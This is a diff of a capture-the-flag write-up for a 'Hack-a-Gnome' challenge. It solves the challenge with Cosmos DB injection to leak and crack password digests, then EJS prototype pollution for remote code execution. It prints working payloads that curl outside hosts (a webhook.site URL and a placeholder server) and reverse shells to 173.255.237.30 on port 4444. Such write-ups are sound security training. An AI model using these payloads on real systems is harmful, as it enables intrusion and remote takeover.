@@ -28,11 +28,14 @@ nav: |
 </tr>
 </tbody>
 </table>
-
+<p>
 <h2>Solution Overview</h2>
-
+<br>
+</p>
+<p>
 Structure Query Language (SQL) injection was used to identify the database type, and then map the structure and contents of the table. This yielded two users and the associated password hashes. The hashes were known and were cracked using crackstation.net. This allowed for login to the application. The hint indicated that the statistics panel used a template. Node.js was identified using server response headers. EJS is the most popular template package for use with node.js, and it is vulnerable to remote code execution (RCE) from prototype pollution. Polluting the prototype with a remote shell payload gave access to the server. Once connected, a README.md file was located that mapped the code structure of the CAN bus. Assuming that the direction commands were in their own command range, and that the range started at the beginning of either the 2XX or 5XX range (because they were adjacent to the defined ranges). This allowed for the identification of the correct codes. Once corrected, the robot was manuevered through the maze to the power switch and the factory was powered down.
-
+<br>
+</p>
 <table>
 <thead>
 <tr>
@@ -81,117 +84,178 @@ Structure Query Language (SQL) injection was used to identify the database type,
 </tr>
 </tbody>
 </table>
-
+<p>
 <h2>Detailed Solution</h2>
+<br>
+</p>
 <details>
+<p>
 <summary>Click to expand</summary>
-
+<br>
+</p>
+<p>
 Starting with the login page, tested several injections attempting to identify the backend database. This nosql injection {“$ne”: null} creates an error:
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/hack-a-gnome_dberror.jpg" alt="Hack-a-Gnome Database Error">
-
+<br>
+</p>
+<p>
 The error message indicates the application is using Azure Cosmos DB!
-
+<br>
+</p>
+<p>
 Key Indicators:
-
+<br>
+</p>
 <ol>
 <li>Microsoft.Azure.Documents.Common/2.14.0 - This is the Azure Cosmos DB SDK</li>
 </ol>
-
 <ol>
 <li>ActivityId - Cosmos DB uses ActivityIds for tracking queries</li>
 </ol>
-
 <ol>
 <li>Error code SC1010 - Cosmos DB-specific error code</li>
 </ol>
-
 <ol>
 <li>"invalid token '$'" - You likely triggered a syntax error in Cosmos DB's SQL-like query language</li>
 </ol>
-
+<p>
 About Cosmos DB:
-
+<br>
+</p>
 <ul>
 <li>Microsoft's NoSQL database service</li>
 </ul>
-
 <ul>
 <li>Uses a SQL-like query language (not standard SQL)</li>
 </ul>
-
 <ul>
 <li>Supports multiple APIs (SQL API, MongoDB API, Cassandra, etc.)</li>
 </ul>
-
 <ul>
 <li>This appears to be using the SQL API based on the error</li>
 </ul>
-
+<p>
 Using the register functionality, it is possible to search for users using the syntax '" OR STARTWITH(c.username, "b") by observing the system response. If username starts with the string, the error message is "Username is taken". If it doesnt startwith the string, then the message is "Username is available". This pattern can be used to identify two users: bruce and harold.
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/hack-a-gnome_user_identification.jpg" alt="Hack-a-Gnome User Identification">
-
+<br>
+</p>
+<p>
 Using similar injection techniques, it is possible to map the database structure.
-
+<br>
+</p>
 <ul>
 <li>'harold" AND IS_DEFINED(c.id)--' is used to identify the field ID  (harold is ID=1, bruce is ID=2)</li>
 </ul>
-
 <ul>
 <li>'harold" AND IS_DEFINED(c.digest)--' is used to identify the field were the password digest is stored.</li>
 </ul>
-
+<p>
 Using trial and error, the length of the digest can be determined using the injection: 'harold" AND Length(c.digest) = 32--'
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/hack-a-gnome_digest_length.jpg" alt="Hack-a-Gnome Password Digest Length">
-
+<br>
+</p>
+<p>
 The digest can only consist of a limited number of characters: 0-9 and a-f.
-
+<br>
+</p>
+<p>
 Using the injection 'harold" AND STARTSWITH(c.digest) = "0"', it is possible to retrieve both digests.
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/hack-a-gnome_digest.jpg" alt="Hack-a-Gnome Password Digest">
-
+<br>
+</p>
+<p>
 Bruce digest: d0a9ba00f80cbc56584ef245ffc56b9e
-
+<br>
+</p>
+<p>
 Harold digest: 07f456ae6a94cb68d740df548847f459
-
+<br>
+</p>
+<p>
 Usiong crackstation.net, it is possible to crack both hashes.
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/hack-a-gnome_digest_crack.jpg" alt="Hack-a-Gnome Password Digest Crack">
-
+<br>
+</p>
+<p>
 Bruce password: oatmeal12
-
+<br>
+</p>
+<p>
 Harold password: oatmeal!!
-
+<br>
+</p>
+<p>
 Once logged in we are presented with the Smart Gnome Control Center as Bruce:
-
+<br>
+</p>
+<p>
 The hint indicates that we should be attempting prototype pollution of the statistics panel.
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/hack-a-gnome_statistics_panel.jpg" alt="Hack-a-Gnome Password Statistics Panel">
-
+<br>
+</p>
+<p>
 The following reference is helpful for understanding prototye polution: https://www.youtube.com/watch?v=W9_x8pc_bh8
-
+<br>
+</p>
+<p>
 Testing prototype pollution:
-
+<br>
+</p>
+<p>
 Key:__proto__
-
+<br>
+</p>
+<p>
 Subkey: toString
-
+<br>
+</p>
+<p>
 Value: a
-
+<br>
+</p>
+<p>
 Message: message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22toString%22%2C%22value%22%3A%22a%22%7D
-
+<br>
+</p>
+<p>
 Sending via Burp:
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/hack-a-gnome_prototypepollution.jpg" alt="Hack-a-Gnome PrototypePollution">
-
+<br>
+</p>
+<p>
 Results in a broken application:
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/hack-a-gnome_prototypepollutionsuccess.jpg" alt="Hack-a-Gnome PrototypePollutionSuccess">
-
+<br>
+</p>
+<p>
 Prototype pollution is possible. Server Headers indicate “Express” which is Node.js. The hint indicates that there are backend templates. Googling "what is the most common template package used with Node.js" indicates that EJS is the most popular package. EJS is also be susceptible to RCE using prototype pollution.
-
+<br>
+</p>
+<p>
 This is the payload:
 <br>
 <pre><code class="language-">
@@ -202,23 +266,35 @@ This is the payload:
   "value": "x;process.mainModule.require('child_process').execSync('curl http://YOUR-SERVER');s"
 }
 </code></pre>
-
+<br>
+</p>
+<p>
 URL Encoded:
 <br>
 <pre><code class="language-">
 message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22outputFunctionName%22%2C%22value%22%3A%22x%3Bprocess.mainModule.require('child_process').execSync('curl%20http%3A%2F%2FYOUR-SERVER')%3Bs%22%7D
 </code></pre>
-
+<br>
+</p>
+<p>
 Payload that uses webhook.site as a sensor:
-
+<br>
+</p>
 <pre><code class="language-">
 message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22outputFunctionName%22%2C%22value%22%3A%22x%3Bprocess.mainModule.require('child_process').execSync('curl%20https%3A%2F%2Fwebhook.site%2Ff3bc21bc-b85f-4bb1-9bf2-bd4ac5767b96')%3Bs%22%7D
+<p>
 </code></pre>
-
+<br>
+</p>
+<p>
 Webhook detects the connection:
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/hack-a-gnome_webhookconnection.jpg" alt="Hack-a-Gnome Webhook Connection">
-
+<br>
+</p>
+<p>
 Weaponizing with Node.JS reverse shell:
 <br>
 <pre><code class="language-">
@@ -229,56 +305,74 @@ Weaponizing with Node.JS reverse shell:
   "value": "x;require('child_process').exec('node -e \\'require(\"net\").connect({port:4444,host:\"173.255.237.30 \"},function(){this.pipe(require(\"child_process\").spawn(\"/bin/sh\",[]).stdin);require(\"child_process\").spawn(\"/bin/sh\",[]).stdout.pipe(this);})\\'');s"
 }
 </code></pre>
-
+<br>
+</p>
+<p>
 Setup a linode linux system with a public IP and a listener on port 4444 to catch the shell.
-
+<br>
+</p>
+<p>
 The message payload for the shell:
 <br>
 <pre><code class="language-">
 message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22outputFunctionName%22%2C%22value%22%3A%22x%3Bprocess.mainModule.require('child_process').execSync('bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F173.255.237.30%2F4444%200%3E%261%5C%22')%3Bs%22%7D
 </code></pre>
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/hack-a-gnome_reverseshell.jpg" alt="Hack-a-Gnome Reverse Shell">
-
+<br>
+</p>
+<p>
 Once the payload is sent, trigger a refresh in the application to load the payload (change name + refresh).
-
+<br>
+</p>
+<p>
 The README.md shows that CAN IDs are grouped by type or purpose. 400 codes are requests, 300 codes are status. It is reasonable to assume that commands are a separate group, either 200 or 500 codes.Lets start with 200, and assume they are sequential. Let’s start with 200-204.  While the shell is active, it is not possible to get any feedback to commands. The process is to connect,  change the python file, disconnect, and then test.
-
+<br>
+</p>
 <pre><code class="language-sh">
 sed -i 's/0x244/0x200/g' canbus_client.py   # up
 sed -i 's/0x245/0x201/g' canbus_client.py   # down
 sed -i 's/0x246/0x202/g' canbus_client.py   # left
 sed -i 's/0x247/0x203/g' canbus_client.py   # right
+<p>
 </code></pre>
-
+<br>
+</p>
+<p>
 Trial and error reveals the codes:
-
+<br>
+</p>
 <ul>
 <li>0x201 = UP</li>
 </ul>
-
 <ul>
 <li>0x202 = DOWN</li>
 </ul>
-
 <ul>
 <li>0x204 = RIGHT</li>
 </ul>
-
 <ul>
 <li>0x203 = LEFT</li>
 </ul>
-
+<p>
 With control of the robot, boxes need to be moved so the power switch can be reached. The robot can only move a single box, so that limits the path.
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/hack-a-gnome_solution.jpg" alt="Hack-a-Gnome Solution">
-
+<br>
+</p>
+<p>
 <strong>Answer: Reach the power switch and shut down the factory</strong>
-
+<br>
+</p>
 </details>
-
+<p>
 <h2>Tools Reference</h2>
-
+<br>
+</p>
 <table>
 <thead>
 <tr>
@@ -309,8 +403,10 @@ With control of the robot, boxes need to be moved so the power switch can be rea
 </tr>
 </tbody>
 </table>
-
+<p>
 <h2>Hints Reference</h2>
+<br>
+</p>
 <table>
 <thead>
 <tr>
@@ -349,8 +445,10 @@ With control of the robot, boxes need to be moved so the power switch can be rea
 </tr>
 </tbody>
 </table>
-
+<p>
 <h2>Acknowledgements</h2>
+<br>
+</p>
 <table>
 <thead>
 <tr>
@@ -365,4 +463,3 @@ With control of the robot, boxes need to be moved so the power switch can be rea
 </tr>
 </tbody>
 </table>
-
